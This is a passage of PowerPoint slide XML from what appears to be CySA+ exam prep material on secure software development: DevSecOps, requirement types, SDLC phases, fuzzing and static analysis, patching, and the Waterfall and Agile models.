            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  This shift-left approach is more effective and far cheaper because flaws found and fixed during design and coding cost far less to remediate than those discovered in production.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because DevSecOps operationalizes continuous vulnerability management, giving the SOC earlier visibility into weaknesses and reducing the volume of defects that ever reach a live environment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: CS0-003 emphasizes DevSecOps as building security in early (shift-left) and integrating automated security testing into the pipeline rather than adding security later.</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537</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SOA AND DEVSECOPS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DevSecOps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Integrates security with DevOps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Increases the priority of security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  No longer an afterthought</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Easier (and cheaper) to design security into software</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  No adding it in later</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538</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SECURE SOFTWARE DEVELOPMENT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Coding Requirements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Coding requirements are the specifications that define how software must behave, and they are grouped into functional, non-functional, and security categories that together drive secure development.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Functional requirements describe the inputs, processes, and outputs the software must produce; non-functional requirements define characteristics such as acceptable character inputs, input constraints, performance, and system limitations; and security requirements specify the behaviors and characteristics needed to meet defined security levels, including how the system safely interacts with other systems.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Capturing these requirements up front lets developers build validation, constraints, and protective behaviors directly into the code rather than discovering gaps after deployment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because vague or missing security and input requirements are a root cause of injection, overflow, and logic flaws, so reviewing requirements is an early and cost-effective point to prevent vulnerabilities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect the exam to distinguish functional, non-functional, and security requirements and to stress defining input constraints and security behaviors early to prevent vulnerabilities.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539</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SECURE SOFTWARE DEVELOPMENT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Coding Requirements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Functional requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Inputs, processes, &amp; outputs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Non-functional requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Character inputs, input constraints, &amp; system limitations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Security requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Behaviors and characteristic to meet security levels</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Interaction with other systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Class includes functional &amp; non-functional aspects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540</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SECURE SOFTWARE DEVELOPMENT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Development Phase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The development phase of the software development life cycle (SDLC) spans design, engineering, and construction, where requirements are turned into working code and security must be built in from the start rather than bolted on later.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A core security activity here is static analysis (static application security testing, or SAST), which examines source code, bytecode, or binaries before the program is ever executed to flag insecure patterns such as SQL injection, buffer overflows, and hardcoded credentials using automated tools that assist both developers and analysts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Manual code review complements automation, with human developers and security staff inspecting logic that scanners miss, such as flawed authentication decisions or business-logic errors.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because vulnerabilities caught during development are far cheaper and safer to fix than those discovered in production, reducing the flow of exploitable defects into the environment they must later defend.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions that ask you to identify static analysis (SAST) and manual code review as pre-execution, development-phase controls, and to distinguish them from dynamic testing done at runtime.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541</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SECURE SOFTWARE DEVELOPMENT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Development Phase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Design</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Engineering</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Construction</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542</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SECURE SOFTWARE DEVELOPMENT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Development Phase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Static analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Before code has been executed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Automated tools assist analyst and developers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Code review</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Manual inspection by human developers and security staff</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543</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SECURE SOFTWARE DEVELOPMENT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Implementation Phase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The implementation phase centers on testing the built software before and during deployment, validating both what it does and how securely and reliably it does it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Functional testing confirms the software performs as designed, non-functional testing checks qualities like performance and infrastructure resilience, and user acceptance testing (UAT) verifies the software behaves as the end user actually expects.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For the security professional this phase includes dynamic analysis and fuzzing, where the application is fed large volumes of malformed, unexpected, or random input to trigger crashes, memory corruption, or unhandled exceptions that reveal exploitable flaws.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst cares because runtime testing like fuzzing exposes input-handling weaknesses that static review cannot see, giving a last chance to catch vulnerabilities before they reach production.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam commonly tests fuzzing as a dynamic input-based technique and asks you to differentiate functional, non-functional, user acceptance, and security testing within the implementation phase.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544</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SECURE SOFTWARE DEVELOPMENT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Implementation Phase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Testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Functional</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Software performs as expected</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Non-functional</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Quality test of infrastructure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  User acceptance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Software acts as user expects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545</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SECURE SOFTWARE DEVELOPMENT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Implementation Phase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Testing for the security professional</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Fuzzing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Give software various input</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Define crashes &amp; exceptions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Stress</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Push limits of software</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Give input the software is expecting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Regression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Test security through updates &amp; patches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546</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SECURE SOFTWARE DEVELOPMENT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Operations &amp; Maintenance Phase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The operations and maintenance phase covers the software's productive life after release, when it is monitored, patched, and supported until retirement.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Maintenance responsibilities must be defined up front, spelling out the security requirements developers and implementers must uphold and establishing a patching cadence, including how often patches ship, under what conditions emergency fixes are issued, and who is accountable for applying them.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because all software eventually reaches end-of-life, this phase also defines when support stops so the organization can plan replacement before the product stops receiving security updates.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because unpatched or end-of-life software is a leading source of exploitable exposure, and clear ownership of patching and EOL directly determines how quickly known vulnerabilities get closed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for questions on patch management responsibility, patch cadence, and recognizing end-of-life or unsupported software as a residual risk that must be tracked and remediated.</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547</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SECURE SOFTWARE DEVELOPMENT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Operations &amp; Maintenance Phase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Maintenance responsibility</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Outline software security requirements for developers &amp; implementers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Patches – how often, under what conditions, who is responsible</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Maintenance phase length</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  All software eventually gets retired</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Define end-of-life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548</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SECURE SOFTWARE DEVELOPMENT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Waterfall Model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Waterfall is a sequential, phase-gated software development methodology in which each stage such as requirements, design, implementation, testing, and maintenance is completed and signed off before the next begins.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Its rigid structure produces heavy documentation and predictable milestones, but security requirements and testing tend to be concentrated late in the cycle, so flaws discovered near the end are expensive and disruptive to fix.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because in a Waterfall shop vulnerability findings often arrive late and change control is slow, meaning remediation timelines and secure design decisions must be pushed as early as possible into the fixed sequence.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam contrasts Waterfall's rigid, sequential phases with Agile's iterative approach and asks how each methodology affects where and when security testing and fixes occur.</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549</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SECURE SOFTWARE DEVELOPMENT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Waterfall Model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g_d809b409a6.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1442641" y="1783080"/>
            <a:ext cx="9303670" cy="4434840"/>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550</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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SECURE SOFTWARE DEVELOPMENT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Agile Model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Agile is an iterative, incremental development methodology that delivers working software in short cycles called sprints, favoring continuous feedback and adaptation over a single fixed plan.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
